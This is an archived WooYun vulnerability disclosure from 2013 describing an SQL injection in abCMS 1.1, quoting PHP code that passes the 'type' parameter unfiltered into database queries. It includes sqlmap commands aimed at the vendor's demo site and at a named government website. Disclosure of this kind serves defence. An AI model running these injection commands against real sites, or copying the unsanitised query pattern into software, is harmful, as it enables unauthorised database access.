{"id": 59668, "wybug_id": "wooyun-2013-046506", "wybug_title": "abCMS 最新1.1版 注射 可导致政府网站沦陷", "wybug_corp": "ABCMS新闻发布系统", "wybug_author": "lxj616", "wybug_date": "2013-12-20 10:23", "wybug_open_date": "2014-03-20 10:23", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "16", "wybug_status": "未联系到厂商或者厂商积极忽略", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["源码审核", "注射漏洞利用技巧", "源码分析"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2013-12-20：\t积极联系厂商并且等待厂商认领中，细节不对外公开\t\t\t\t\t\t\t\t\t2014-03-20：\t厂商已经主动忽略漏洞，细节向公众公开  简要描述： abcms 最新1.1版 注射 可导致政府网站沦陷在某政府网站做演示+官网demo演示+代码分析由于涉及gov.cn，不知道这样的漏洞应该找厂商还是CNVD源码分析见详细说明，实例证明见漏洞证明 详细说明：  abcms 1.1/app/controller/news.php    line：218\n...//之前的不用管\t\t\tif(empty($config))\t\t\t{\t\t\t$types = (int)$_GET['type']; //强转整数 无漏洞\t\t\t//var_dump($type);exit;\t\t\t$bannertitle = $this->daohang->find(\"id = {$types}\");//无漏洞\t\t\t//var_dump($bannertitle);exit;\t\t\t$daohangurl = \"./index.php?controller=News&action=listnews&type=$types&fenlei=$fenlei\"; //等等，过滤完变量然后GET跳转？\n直接去找跳转后的接收代码，即action=listnews&type=$types/app/controller/default.php    line:384\n$page = $_GET['page'] ? ($_GET['page']-1)*30 : 0;//page没问题\t\t\t\t//查询数据\t\t\t\t$listnews = $this->news->findAll(\"type = $_GET[type]\",'id desc',array(30,$page));//type直接带入查询了\t\t\t\t//var_dump($listnews);exit;\t\t\t\t$type = $this->daohang->findall(\"id = $_GET[type]\",'id desc',1);//之前的过滤全白费了\t\t\t\t$bannertitle = $type[0]['name'];\n所以，type变量由于过滤错了地方，引发了注射发现有gov.cn在用这一款CMS，详见漏洞证明   漏洞证明：  先演示官网的\nC:\\Users\\Administrator>sqlmap.py -u \"http://www.abcms.net/xinli/index.php?controller=Default&action=read&type=5\" -p type --tables\n\n\n再演示gov.cn的ldj.jiangmen.gov.cn广东省江门市人力资源和社会保障局 \n\n漏洞URL：http://ldj.jiangmen.gov.cn/outside/shebk/index.php?action=read&type=22\n\n\nC:\\Users\\Administrator>sqlmap.py -u \"http://ldj.jiangmen.gov.cn/outside/shebk/index.php?action=read&type=22\" -p type --tables\n\n\n上面的数据库明显是abcms，下面的数据库不知道是什么，好像有好多数据！   修复方案：  过滤type彻底一些吧   版权声明：转载请注明来源 lxj616@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 未能联系到厂商或者厂商积极拒绝  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "无影响厂商忽略", "wybug_rank_fromcorp": 0, "Ranks": null}